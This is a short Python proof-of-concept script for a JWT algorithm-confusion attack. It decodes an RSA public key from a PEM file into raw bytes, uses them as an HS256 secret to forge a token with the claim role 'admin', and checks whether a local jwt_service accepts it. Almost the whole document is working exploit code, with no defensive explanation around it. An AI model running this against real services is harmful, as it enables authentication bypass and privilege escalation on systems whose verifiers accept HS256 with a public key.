from jose import jws
import base64
import re

# Load pubkey.pem as raw bytes
pem = open("pubkey.pem").read()

# Remove PEM headers
pem_body = re.sub(r"-----.*?-----", "", pem).strip()

# Decode into raw bytes (DER-encoded SubjectPublicKeyInfo)
raw_key = base64.b64decode(pem_body)

# Sign token using HS256 (vulnerable mode)
token = jws.sign(
    {"role": "admin"},
    raw_key,                  # <-- send raw bytes, NOT PEM string
    algorithm="HS256"
)

print(token)


from jwt_service import verify
print(verify(token))
